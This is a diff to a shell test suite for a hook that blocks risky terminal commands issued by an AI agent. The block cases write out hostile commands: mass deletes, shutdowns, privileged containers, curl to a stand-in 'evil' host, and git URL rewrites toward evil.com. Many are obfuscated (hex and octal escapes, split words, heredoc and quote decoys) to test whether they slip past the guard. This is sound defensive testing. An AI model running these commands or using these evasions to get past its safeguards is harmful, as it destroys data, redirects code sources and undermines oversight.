@@ -88,6 +88,216 @@ g "git push force" block '{"tool_name":"terminal","tool_input":{"command":"git p
 g "rm -rf"         block '{"tool_name":"terminal","tool_input":{"command":"rm -rf build"}}'
 g "plain rm"       allow '{"tool_name":"terminal","tool_input":{"command":"rm tmp.txt"}}'
 g "schtasks"       block '{"tool_name":"terminal","tool_input":{"command":"schtasks /delete /tn X"}}'
+# HIMMEL-4134: the compound keywords and exec-style wrappers the shell hook's
+# CMDPOS carries (HIMMEL-3983/3984) start a command here too.
+g "nohup shutdown"        block '{"tool_name":"terminal","tool_input":{"command":"nohup shutdown now"}}'
+g "timeout 5 reboot"      block '{"tool_name":"terminal","tool_input":{"command":"timeout -s KILL 5 reboot"}}'
+g "exec -a 'q v' shutdown" block '{"tool_name":"terminal","tool_input":{"command":"exec -a '"'"'custom process'"'"' shutdown now"}}'
+g "nice -n \"1 2\" reboot" block '{"tool_name":"terminal","tool_input":{"command":"nice -n \"1 0\" reboot"}}'
+g "sudo -u 'a b' shutdown" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u '"'"'a b'"'"' shutdown now"}}'
+g "env -C \"a b\" reboot"  block '{"tool_name":"terminal","tool_input":{"command":"env -C \"my dir\" reboot"}}'
+g "xargs -0 taskkill"     block '{"tool_name":"terminal","tool_input":{"command":"ls | xargs -0 taskkill /f"}}'
+g "then shutdown"         block '{"tool_name":"terminal","tool_input":{"command":"if true; then shutdown now; fi"}}'
+g "do format"             block '{"tool_name":"terminal","tool_input":{"command":"for x in a; do format c:; done"}}'
+g "f() { reboot; }"       block '{"tool_name":"terminal","tool_input":{"command":"f() { reboot; }"}}'
+# HIMMEL-4158: mixed quoted/bare, ANSI-C and escaped value words; quoted flag words.
+g "sudo -u 'a b'c shutdown" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u '"'"'a b'"'"'c shutdown"}}'
+g "sudo -u a' b' reboot"    block '{"tool_name":"terminal","tool_input":{"command":"sudo -u a'"'"' b'"'"' reboot"}}'
+g "exec -a 'a b'c shutdown" block '{"tool_name":"terminal","tool_input":{"command":"exec -a '"'"'a b'"'"'c shutdown"}}'
+g "nice -n 'a b'c reboot"   block '{"tool_name":"terminal","tool_input":{"command":"nice -n '"'"'a b'"'"'c reboot"}}'
+g "sudo -u \$'a b' reboot"  block '{"tool_name":"terminal","tool_input":{"command":"sudo -u $'"'"'a b'"'"' reboot"}}'
+# shellcheck disable=SC1003  # '\\' is a JSON-escaped backslash inside $'..', not a quote escape
+g "sudo -u \$'a\\' b' reboot" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u $'"'"'a\\'"'"' b'"'"' reboot"}}'
+g "sudo -u \"a\\\" b\" reboot" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u \"a\\\" b\" reboot"}}'
+g "sudo -u a\\ b reboot"    block '{"tool_name":"terminal","tool_input":{"command":"sudo -u a\\ b reboot"}}'
+g "sudo -u'a b c' reboot"   block '{"tool_name":"terminal","tool_input":{"command":"sudo -u'"'"'a b c'"'"' reboot"}}'
+g "sudo -u 'a b'c ls"       allow '{"tool_name":"terminal","tool_input":{"command":"sudo -u '"'"'a b'"'"'c ls"}}'
+g "sudo -u \"a b\\\" reboot" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u \"a b\\\" reboot"}}'
+# HIMMEL-4190: `find ... -delete` is a recursive delete of its own (the .sh
+# FIND_DELETE_PAT twin), bare and behind a wrapper, with a quoted wrapper value.
+g "find d -delete"          block '{"tool_name":"terminal","tool_input":{"command":"find d -delete"}}'
+g "find -name x -delete"    block '{"tool_name":"terminal","tool_input":{"command":"find . -name x -delete"}}'
+g "find.exe d -delete"      block '{"tool_name":"terminal","tool_input":{"command":"find.exe d -delete"}}'
+g "ls; find d -delete"      block '{"tool_name":"terminal","tool_input":{"command":"ls; find d -delete"}}'
+g "find d -delete; x"       block '{"tool_name":"terminal","tool_input":{"command":"find d -delete; echo ok"}}'
+g "find ';' -delete"        block '{"tool_name":"terminal","tool_input":{"command":"find d -name '"'"';'"'"' -delete"}}'
+g "nice find -delete"       block '{"tool_name":"terminal","tool_input":{"command":"nice find d -delete"}}'
+g "nice -n 'a b' find -delete" block '{"tool_name":"terminal","tool_input":{"command":"nice -n '"'"'1 0'"'"' find d -delete"}}'
+g "sudo -u \"a b\" find -delete" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u \"a b\" find d -delete"}}'
+g "timeout 5 find -delete"  block '{"tool_name":"terminal","tool_input":{"command":"timeout 5 find d -delete"}}'
+g "env X=1 find -delete"    block '{"tool_name":"terminal","tool_input":{"command":"env X=1 find d -delete"}}'
+g "/usr/bin/find -delete"   block '{"tool_name":"terminal","tool_input":{"command":"/usr/bin/find d -delete"}}'
+g "then find -delete"       block '{"tool_name":"terminal","tool_input":{"command":"if true; then find d -delete; fi"}}'
+g "find -deleted"           allow '{"tool_name":"terminal","tool_input":{"command":"find d -name x -deleted"}}'
+g "find -delete-x"          allow '{"tool_name":"terminal","tool_input":{"command":"find d -delete-x"}}'
+g "find -print"             allow '{"tool_name":"terminal","tool_input":{"command":"find d -name x -print"}}'
+g "echo find -delete"       allow '{"tool_name":"terminal","tool_input":{"command":"echo find d -delete"}}'
+g "grep find -delete"       allow '{"tool_name":"terminal","tool_input":{"command":"grep find -delete notes.txt"}}'
+g "findx -delete"           allow '{"tool_name":"terminal","tool_input":{"command":"findx d -delete"}}'
+# HIMMEL-4255: the find-family deletes the .sh hook denies too. A launcher that
+# runs its argument as a command (busybox, command, eval, a shell's -c) keeps
+# find at command position. gc builds the payload from the raw command.
+gc() { g "$1" "$2" "$("$PY" -c 'import json,sys; print(json.dumps({"tool_name": "terminal", "tool_input": {"command": sys.argv[1]}}))' "$3")"; }
+gc "busybox find -delete"         block 'busybox find d -delete'
+gc "/bin/busybox find -delete"    block '/bin/busybox find d -delete'
+gc "command find -delete"         block 'command find d -delete'
+gc "command -p find -delete"      block 'command -p find d -delete'
+gc "command -- find -delete"      block 'command -- find d -delete'
+gc "bash -c 'find -delete'"       block "bash -c 'find d -delete'"
+gc "sh -c 'find -delete'"         block "sh -c 'find d -delete'"
+gc 'zsh -c "find -delete"'        block 'zsh -c "find d -delete"'
+gc "dash -c 'find -delete'"       block "dash -c 'find d -delete'"
+gc "bash -lc 'find -delete'"      block "bash -lc 'find d -delete'"
+gc "bash -o pipefail -c 'find'"   block "bash -o pipefail -c 'find d -delete'"
+gc "/bin/bash -c 'find -delete'"  block "/bin/bash -c 'find d -delete'"
+gc "eval find -delete"            block 'eval find d -delete'
+gc 'eval "find -delete"'          block 'eval "find d -delete"'
+gc "find -exec rm {} +"           block 'find d -exec rm {} +'
+gc "find -exec rm {} \\;"         block 'find d -exec rm {} \;'
+gc "find -execdir rm {} +"        block 'find d -execdir rm {} +'
+gc "find -execdir rm {} \\;"      block 'find d -execdir rm {} \;'
+gc "find -ok rm {} \\;"           block 'find d -ok rm {} \;'
+gc "find -okdir rm {} \\;"        block 'find d -okdir rm {} \;'
+gc "find -exec /bin/rm {} +"      block 'find d -exec /bin/rm {} +'
+gc "find -exec /usr/bin/rm {} \\;" block 'find d -exec /usr/bin/rm {} \;'
+gc "find -okdir /usr/bin/rm {} +" block 'find d -okdir /usr/bin/rm {} +'
+gc "find -exec 'rm' {} +"         block "find d -exec 'rm' {} +"
+gc "find -exec rm -f {} +"        block 'find . -name x -exec rm -f {} +'
+gc "find -exec sudo rm {} +"      block 'find d -exec sudo rm {} +'
+gc "find -exec busybox rm {} +"   block 'find d -exec busybox rm {} +'
+gc "find -exec sh -c 'rm' {} +"   block "find d -exec sh -c 'rm \"\$@\"' _ {} +"
+gc "fd -X rm"                     block 'fd x -X rm'
+gc "fd -x rm"                     block 'fd x -x rm'
+gc "fd --exec rm"                 block 'fd x --exec rm'
+gc "fd --exec-batch rm"           block 'fd x --exec-batch rm'
+gc "fd -X /bin/rm"                block 'fd x -X /bin/rm'
+gc "xargs rm"                     block 'ls | xargs rm'
+gc "xargs -0 rm"                  block 'ls | xargs -0 rm'
+gc "xargs -0 -n 1 rm"             block 'ls | xargs -0 -n 1 rm'
+gc "xargs -r -P4 rm"              block 'ls | xargs -r -P4 rm'
+gc "xargs -I {} rm {}"            block 'ls | xargs -I {} rm {}'
+gc "xargs --null rm"              block 'ls | xargs --null rm'
+gc "xargs -0 /bin/rm"             block 'ls | xargs -0 /bin/rm'
+gc "xargs rm -f"                  block 'ls | xargs rm -f'
+gc "xargs < list rm"              block 'xargs rm < list'
+# The same forms behind the wrappers the command-position grammar models.
+gc "sudo busybox find -delete"    block 'sudo busybox find d -delete'
+gc "env busybox find -delete"     block 'env busybox find d -delete'
+gc "nice command find -delete"    block 'nice command find d -delete'
+gc "nohup busybox find -delete"   block 'nohup busybox find d -delete'
+gc "timeout 5 busybox find"       block 'timeout 5 busybox find d -delete'
+gc "time eval find -delete"       block 'time eval find d -delete'
+gc "exec busybox find -delete"    block 'exec busybox find d -delete'
+gc "sudo bash -c 'find -delete'"  block "sudo bash -c 'find d -delete'"
+gc "env sh -c 'find -delete'"     block "env sh -c 'find d -delete'"
+gc "nohup sh -c 'find -delete'"   block "nohup sh -c 'find d -delete'"
+gc "timeout 5 sh -c 'find'"       block "timeout 5 sh -c 'find d -delete'"
+gc "bash -c 'sudo find -delete'"  block "bash -c 'sudo find d -delete'"
+gc "command busybox find"         block 'command busybox find d -delete'
+gc "sudo find -exec rm {} +"      block 'sudo find d -exec rm {} +'
+gc "busybox find -exec rm {} +"   block 'busybox find d -exec rm {} +'
+gc "bash -c 'find -exec rm'"      block "bash -c 'find d -exec rm {} +'"
+gc "nice fd -X rm"                block 'nice fd x -X rm'
+gc "sudo xargs rm"                block 'ls | sudo xargs rm'
+gc "nice xargs rm"                block 'ls | nice xargs rm'
+gc "env xargs rm"                 block 'ls | env xargs rm'
+gc "busybox xargs rm"             block 'ls | busybox xargs rm'
+gc "xargs sudo rm"                block 'ls | xargs sudo rm'
+gc "xargs nice rm"                block 'ls | xargs nice rm'
+gc "xargs busybox rm"             block 'ls | xargs busybox rm'
+gc "xargs sh -c 'rm'"             block "ls | xargs sh -c 'rm \"\$@\"' _"
+gc "bash -c 'ls | xargs rm'"      block "bash -c 'ls | xargs rm'"
+# PR 1799 CR (codex-1): every head word the mass-delete patterns match takes
+# an optional .exe and a path prefix, xargs included.
+gc 'ls | xargs.exe rm' block 'ls | xargs.exe rm'
+gc 'ls | /usr/bin/xargs rm' block 'ls | /usr/bin/xargs rm'
+gc 'ls | /usr/bin/xargs.exe -0 rm' block 'ls | /usr/bin/xargs.exe -0 rm'
+gc 'ls | xargs.exe -0 -n 1 rm' block 'ls | xargs.exe -0 -n 1 rm'
+gc 'ls | sudo xargs.exe rm' block 'ls | sudo xargs.exe rm'
+gc 'ls | xargs.exe busybox.exe rm' block 'ls | xargs.exe busybox.exe rm'
+gc 'ls | xargs.exe find d -delete' block 'ls | xargs.exe find d -delete'
+gc 'busybox.exe find d -delete' block 'busybox.exe find d -delete'
+gc '/bin/busybox.exe find d -delete' block '/bin/busybox.exe find d -delete'
+gc 'command.exe find d -delete' block 'command.exe find d -delete'
+gc 'eval.exe find d -delete' block 'eval.exe find d -delete'
+gc 'find d -exec busybox.exe rm {} +' block 'find d -exec busybox.exe rm {} +'
+gc 'ls | busybox.exe xargs rm' block 'ls | busybox.exe xargs rm'
+gc 'ls | command.exe xargs rm' block 'ls | command.exe xargs rm'
+gc 'find.exe d -delete' block 'find.exe d -delete'
+gc 'fd.exe x -X rm' block 'fd.exe x -X rm'
+gc 'find d -exec rm.exe {} +' block 'find d -exec rm.exe {} +'
+gc 'ls | xargs.exe rmdir' allow 'ls | xargs.exe rmdir'
+gc 'ls | xargs.exe grep rm' allow 'ls | xargs.exe grep rm'
+gc 'echo xargs.exe rm' allow 'echo xargs.exe rm'
+# Lookalikes stay allowed: no find/xargs at command position, no rm word.
+gc "echo busybox find -delete ok" allow 'echo busybox find d -delete'
+gc 'commit "bash -c find" ok'     allow "git commit -m \"use bash -c 'find d -delete'\""
+gc "command -v find ok"           allow 'command -v find'
+gc "bash -c 'find -name' ok"      allow "bash -c 'find d -name x'"
+gc "eval ls ok"                   allow 'eval ls -la'
+gc "busybox ls ok"                allow 'busybox ls d'
+gc "find -exec ls {} + ok"        allow 'find d -exec ls {} +'
+gc "find -exec rmdir {} + ok"     allow 'find d -exec rmdir {} +'
+gc "fd -x rmate ok"               allow 'fd x -x rmate'
+gc "xargs rmdir ok"               allow 'ls | xargs rmdir'
+gc "xargs grep rm ok"             allow 'ls | xargs grep rm'
+gc "echo x -exec rm y ok"         allow 'echo x -exec rm y'
+gc 'commit "a xargs rm b" ok'     allow 'git commit -m "a xargs rm b"'
+gc "find -exec rm {} \\; -prune"   block 'find . -name x -exec rm {} \; -prune'
+gc "find -exec ls {} \\; -prune ok" allow 'find . -name x -exec ls {} \; -prune'
+# The new anchors (xargs, -exec) stay linear on a 100 KB command.
+# The payload is built before the clock starts, so only the guard is timed.
+for unit in '; xargs -0 x' ' -exec x'; do
+  payload=$("$PY" -c 'import json,sys; print(json.dumps({"tool_name": "terminal", "tool_input": {"command": "echo hi" + sys.argv[1] * 8000 + "; docker run --privileged alpine"}}))' "$unit")
+  t0=$SECONDS
+  g "${unit}x8000 then docker (linear)" block "$payload"
+  if [ $((SECONDS - t0)) -gt 3 ]; then
+    echo "  FAIL: ${unit}x8000 took $((SECONDS - t0))s" >&2; fails=$((fails + 1)); fi
+done
+# HIMMEL-4158: overlapping readings of one flag run stay linear; a backtracking
+# regex took minutes on these (the hermes hook timeout is 10s).
+for rep in "-u 'a' " '-u"x ' '-u "x -u " ' "-u 'x -u ' "; do
+  cmd="sudo "; i=0
+  while [ "$i" -lt 30 ]; do cmd="$cmd$rep"; i=$((i + 1)); done
+  t0=$SECONDS
+  g "sudo ${rep}x30 (linear)" allow "$("$PY" -c 'import json,sys; print(json.dumps({"tool_name": "terminal", "tool_input": {"command": sys.argv[1] + "zz"}}))' "$cmd")"
+  if [ $((SECONDS - t0)) -gt 5 ]; then
+    echo "  FAIL: sudo ${rep}x30 took $((SECONDS - t0))s" >&2; fails=$((fails + 1)); fi
+done
+# HIMMEL-4190: the find -delete scan is linear too. 3000 `find` anchors with no
+# -delete, then a later-checked denied command: quadratic re-scans pushed the
+# head past the 10s hook timeout (which fails open) where base blocked in 0.1s.
+t0=$SECONDS
+pad="echo hi"; i=0
+while [ "$i" -lt 3000 ]; do pad="$pad; find -delet -delet -delet -delet -delet"; i=$((i + 1)); done
+g "find anchors x3000 then docker (linear)" block "$("$PY" -c 'import json,sys; print(json.dumps({"tool_name": "terminal", "tool_input": {"command": sys.argv[1] + "; docker run --privileged alpine"}}))' "$pad")"
+if [ $((SECONDS - t0)) -gt 5 ]; then
+  echo "  FAIL: find anchors x3000 took $((SECONDS - t0))s" >&2; fails=$((fails + 1)); fi
+# A "(" run is an anchor at every paren; the exe-prefix run must not rescan it
+# (10 KB took 16.6s at head, 3.1s at base, vs the 10s fail-open timeout).
+# shellcheck disable=SC2016 # literal "$(" is the payload, not an expansion
+for opener in '(' '$('; do
+  t0=$SECONDS
+  pad="echo "; i=0
+  while [ "$i" -lt 10000 ]; do pad="$pad$opener"; i=$((i + 1)); done
+  g "${opener}x10000 -delete then docker (linear)" block "$("$PY" -c 'import json,sys; print(json.dumps({"tool_name": "terminal", "tool_input": {"command": sys.argv[1] + " -delete; docker run --privileged alpine"}}))' "$pad")"
+  if [ $((SECONDS - t0)) -gt 3 ]; then
+    echo "  FAIL: ${opener}x10000 took $((SECONDS - t0))s" >&2; fails=$((fails + 1)); fi
+done
+# ") {" is a second anchor kind ("){" x6000 took 12.3s at head, 2.5s at base).
+for spec in '){:6000' '){/:4000'; do
+  opener=${spec%:*}; count=${spec#*:}
+  t0=$SECONDS
+  pad="echo "; i=0
+  while [ "$i" -lt "$count" ]; do pad="$pad$opener"; i=$((i + 1)); done
+  g "${opener}x${count} -delete then docker (linear)" block "$("$PY" -c 'import json,sys; print(json.dumps({"tool_name": "terminal", "tool_input": {"command": sys.argv[1] + " -delete; docker run --privileged alpine"}}))' "$pad")"
+  if [ $((SECONDS - t0)) -gt 3 ]; then
+    echo "  FAIL: ${opener}x${count} took $((SECONDS - t0))s" >&2; fails=$((fails + 1)); fi
+done
+g "-delete before find"     allow '{"tool_name":"terminal","tool_input":{"command":"echo -delete; find d -print"}}'
+g "echo do shutdown"      allow '{"tool_name":"terminal","tool_input":{"command":"echo do shutdown"}}'
+g "jq {format}"           allow '{"tool_name":"terminal","tool_input":{"command":"jq {format: .x} f"}}'
+g "fix(x) shutdown text"  allow '{"tool_name":"terminal","tool_input":{"command":"echo fix(x) shutdown flow"}}'
 # HIMMEL-1141: schtasks /query is read-only (allowed); other mutating verbs refused.
 g "schtasks /query allowed"      allow '{"tool_name":"terminal","tool_input":{"command":"schtasks /query /fo LIST /v"}}'
 g "schtasks.exe /query allowed"  allow '{"tool_name":"terminal","tool_input":{"command":"schtasks.exe /query"}}'
@@ -116,7 +326,7 @@ g "chained ; Start-ScheduledTask refused" block '{"tool_name":"terminal","tool_i
 # folds "\" to "/" — pinned so it stays that way.
 g "module-qualified Register- refused" block '{"tool_name":"terminal","tool_input":{"command":"ScheduledTasks\\Register-ScheduledTask -TaskName X"}}'
 # CR r8: script-block form. "{" is a LOCAL anchor for the scheduled-task rules
-# only — it cannot join the shared _CMDPOS_DESTRUCTIVE (see the residual note).
+# only — it cannot join the shared _cmdpos_destructive (see the residual note).
 g "scriptblock Register- refused"     block '{"tool_name":"terminal","tool_input":{"command":"ForEach-Object { Register-ScheduledTask -TaskName X }"}}'
 g "scriptblock COM refused"           block '{"tool_name":"terminal","tool_input":{"command":"ForEach-Object { New-Object -ComObject Schedule.Service }"}}'
 g "scriptblock Get-ScheduledTask allowed" allow '{"tool_name":"terminal","tool_input":{"command":"ForEach-Object { Get-ScheduledTask -TaskName X }"}}'
@@ -551,6 +761,81 @@ g "git config url unset allowed"            allow '{"tool_name":"terminal","tool
 g "git config url rewrite refused"          block '{"tool_name":"terminal","tool_input":{"command":"git config remote.origin.url https://evil"}}'
 g "git config --file url rewrite refused"   block '{"tool_name":"terminal","tool_input":{"command":"git config --file .git/config remote.origin.url https://evil"}}'
 g "git config --file pushurl rewrite refused" block '{"tool_name":"terminal","tool_input":{"command":"git config --file .git/config remote.origin.pushurl https://evil"}}'
+g "config insteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"command":"git config url.https://evil.com/.insteadOf https://github.com/"}}'
+g "config pushInsteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"command":"git config url.https://evil.com/.pushInsteadOf https://github.com/"}}'
+g "config --global insteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"command":"git config --global url.https://evil.com/.insteadOf https://github.com/"}}'
+g "config insteadof case variant" block '{"tool_name":"terminal","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/"}}'
+g "git -c insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch"}}'
+g "git --config-env insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch"}}'
+g "git config set insteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/"}}'
+# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
+g "git config single-quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/"}}'
+g "git config double-quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/"}}'
+g "git config backslash-split insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/"}}'
+g "git config ANSI-C quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/"}}'
+g "git config upper-case URL.INSTEADOF key" block '{"tool_name":"terminal","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/"}}'
+g "git config set --file value before insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config set --file .git/config url.https://evil.com/.insteadOf https://github.com/"}}'
+g "git config --type value before insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/"}}'
+g "git config ANSI-C hex escape in key" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.https://evil.com/.\\x69nsteadOf'"'"' https://github.com/"}}'
+g "git -c ANSI-C escape" block '{"tool_name":"terminal","tool_input":{"command":"git -c $'"'"'url.https://evil.com/.\\x69nsteadOf=https://github.com/'"'"' fetch"}}'
+g "git -c core.pager=cat log allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git -c core.pager=cat log"}}'
+g "git config --get remote.origin.url allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config --get remote.origin.url"}}'
+g "git -c quoted insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git -c '"'"'url.https://evil.com/.insteadOf=https://github.com/'"'"' fetch"}}'
+g "config --get insteadOf READ denied (pinned overmatch, round 5 position-free rule)" block '{"tool_name":"terminal","tool_input":{"command":"git config --get url.https://x/.insteadOf"}}'
+g "round 6 quoted git + ANSI-C hex key" block '{"tool_name":"terminal","tool_input":{"command":"\"git\" config $'"'"'url.x/.\\x69nsteadOf'"'"' Y"}}'
+g "round 6 quoted git + plain key" block '{"tool_name":"terminal","tool_input":{"command":"\"git\" config url.x/.insteadof Y"}}'
+g "round 6 split git executable + -c key" block '{"tool_name":"terminal","tool_input":{"command":"g'"'"''"'"'it -c url.x.insteadof=y"}}'
+g "round 6 git log --oneline allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git log --oneline"}}'
+g "round 7 escaped executable + escaped key" block '{"tool_name":"terminal","tool_input":{"command":"$'"'"'\\x67it'"'"' config $'"'"'url.https://evil.example/.\\x69nsteadOf'"'"' https://source.example/"}}'
+g "round 7 octal executable" block '{"tool_name":"terminal","tool_input":{"command":"$'"'"'\\147\\151\\164'"'"' config url.x.insteadof Y"}}'
+g "round 7 escaped config subcommand" block '{"tool_name":"terminal","tool_input":{"command":"git $'"'"'\\x63onfig'"'"' url.x.insteadof Y"}}'
+g "round 7 split executable, hex-escaped middle letter" block '{"tool_name":"terminal","tool_input":{"command":"g$'"'"'\\x69'"'"'\"t\" -c url.x.insteadof=y"}}'
+g "round 7 unterminated ANSI-C segment" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.x.insteadof Y"}}'
+g "round 7 NUL octal ends the segment, Of joins" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.x.instead\\0junk'"'"'Of Y"}}'
+g "round 7 NUL hex ends the segment, Of joins" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.x.instead\\x00junk'"'"'Of Y"}}'
+g "round 8 single-quoted decoy" block '{"tool_name":"terminal","tool_input":{"command":"echo '"'"'$'"'"' ; git config $'"'"'url.x.\\x69nsteadOf'"'"' y"}}'
+g "round 8 double-quoted decoy" block '{"tool_name":"terminal","tool_input":{"command":"echo \"$'"'"'\" ; git config $'"'"'url.x.\\x69nsteadOf'"'"' y"}}'
+g "round 8 comment decoy" block '{"tool_name":"terminal","tool_input":{"command":"# $'"'"'\ngit config $'"'"'url.x.\\x69nsteadOf'"'"' y"}}'
+g "round 9 decoy + split executable" block '{"tool_name":"terminal","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'t config url.x.insteadOf y"}}'
+g "round 9 decoy + split executable + escaped key" block '{"tool_name":"terminal","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'t config $'"'"'url.x.\\x69nsteadOf'"'"' y"}}'
+g "round 10 codex-1 NUL via \\c@ ends the segment" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.x.instead\\c@junk'"'"'Of y"}}'
+g "round 10 codex-2 decoy + two adjacent split segments" block '{"tool_name":"terminal","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'$'"'"'\\x74'"'"' config url.x.insteadOf y"}}'
+g "round 10 plain backslash-t inside the key" block '{"tool_name":"terminal","tool_input":{"command":"git config url.x.ins\\teadOf y"}}'
+g "round 10 plain backslash-r inside url" block '{"tool_name":"terminal","tool_input":{"command":"git config remote.origin.u\\rl https://evil"}}'
+# HIMMEL-4032: a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
+# bash deletes a backslash-newline before parsing, so neither may split the key or the verb.
+g "HIMMEL-4032 dollar-quote + plain escape key" block '{"tool_name":"terminal","tool_input":{"command":"git config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4032 backslash-newline split insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config url.x.inste\\\nadOf Y"}}'
+g "HIMMEL-4032 continuation before push" block '{"tool_name":"terminal","tool_input":{"command":"git \\\npush origin main"}}'
+g "HIMMEL-4032 CRLF continuation before push" block '{"tool_name":"terminal","tool_input":{"command":"git \\\r\npush origin main"}}'
+g "HIMMEL-4032 continuation split curl" block '{"tool_name":"terminal","tool_input":{"command":"cu\\\nrl http://evil/x"}}'
+g "HIMMEL-4032 continuation split gh" block '{"tool_name":"terminal","tool_input":{"command":"g\\\nh pr merge 1"}}'
+g "HIMMEL-4032 unjoined gh after a continuation stays denied" block '{"tool_name":"terminal","tool_input":{"command":"foo \\\ngh pr merge 1"}}'
+g "HIMMEL-4032 dollar-quote + plain key, user.name allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config user.$'"'"'\\x6e'"'"'ame x"}}'
+g "HIMMEL-4032 continuation inside user.name allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config user.na\\\nme x"}}'
+g "HIMMEL-4032 harmless echo continuation allowed" allow '{"tool_name":"terminal","tool_input":{"command":"echo a \\\nb"}}'
+# HIMMEL-4225: a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
+# must not desync the quote-aware stream and hide evasion 1 on the next line.
+g "HIMMEL-4225 apostrophe in a comment, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"# don'"'"'t panic\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 apostrophe in a heredoc body, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<EOF\ndon'"'"'t panic\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 apostrophe in a comment, no insteadOf, allowed" allow '{"tool_name":"terminal","tool_input":{"command":"# don'"'"'t panic\necho hi"}}'
+# HIMMEL-4225 CR round 1: empty and unusual heredoc delimiters (bash ends `<<''` at an empty
+# line) and an arithmetic `<<` must not desync the decoder either.
+g "HIMMEL-4225 empty single-quoted heredoc delimiter <<'', then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<'"'"''"'"'\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 empty double-quoted heredoc delimiter <<\"\", then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<\"\"\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 empty <<-'' delimiter, tab-only terminator, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<-'"'"''"'"'\n\tdon'"'"'t panic\n\t\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 empty <<-\"\" delimiter, empty terminator, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<-\"\"\n\tdon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 backslash-newline inside the heredoc delimiter, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<\\\nEOF\ndon'"'"'t\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+# shellcheck disable=SC2016  # literal $ is the payload
+g "HIMMEL-4225 ANSI-C heredoc delimiter \$'E\\x4fF', then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<$'"'"'E\\x4fF'"'"'\n$E\\x4fF\ndon'"'"'t\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 escaped quote inside a double-quoted heredoc delimiter, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<\"E\\\"F\"\ndon'"'"'t\nE\"F\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+# shellcheck disable=SC2016  # literal $ is the payload
+g "HIMMEL-4225 arithmetic << is not a heredoc, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"echo $((1<<2))\n# don'"'"'t\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
+g "HIMMEL-4225 empty heredoc delimiter, no insteadOf, allowed" allow '{"tool_name":"terminal","tool_input":{"command":"cat <<'"'"''"'"'\nit'"'"'s fine\n\necho ok"}}'
+g "round 7 git commit -m ANSI-C allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git commit -m $'"'"'l1\\nl2'"'"'"}}'
+g "round 7 git log --format=ANSI-C allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git log --format=$'"'"'%h\\t%s'"'"'"}}'
